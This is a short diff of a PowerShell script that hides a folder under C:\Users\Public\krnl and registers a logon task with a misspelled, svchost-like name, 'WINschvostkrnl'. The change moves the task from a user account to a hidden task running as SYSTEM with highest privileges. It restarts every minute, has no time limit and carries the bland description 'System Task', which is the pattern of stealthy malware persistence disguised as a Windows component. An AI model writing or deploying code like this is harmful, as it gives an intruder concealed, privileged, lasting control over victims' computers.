@@ -14,9 +14,4 @@ Set-ItemProperty -Path "C:\Users\Public\krnl\schvostkrnl-debug.exe" -Name Creati
 
 Set-ItemProperty -Path "C:\Users\Public\krnl" -Name Attributes -Value Hidden
 
-Register-ScheduledTask -TaskName "WINschvostkrnl" `
-  -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start C:\Users\Public\krnl\schvostkrnl-debug.exe" -WorkingDirectory "C:\Users\Public\krnl") `
-  -Trigger (New-ScheduledTaskTrigger -AtLogon) `
-  -Principal (New-ScheduledTaskPrincipal -UserId "krnlrunner" -LogonType Password -RunLevel Highest) `
-  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) `
-  -Description "System Task" -Force
+Register-ScheduledTask -TaskName "WINschvostkrnl" -Action (New-ScheduledTaskAction -Execute "C:\Users\Public\krnl\schvostkrnl.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -StartWhenAvailable -Hidden -ExecutionTimeLimit 0 -RestartInterval (New-TimeSpan -Minutes 1) -RestartCount 5) -TaskPath "\" -Description "System Task" -Force
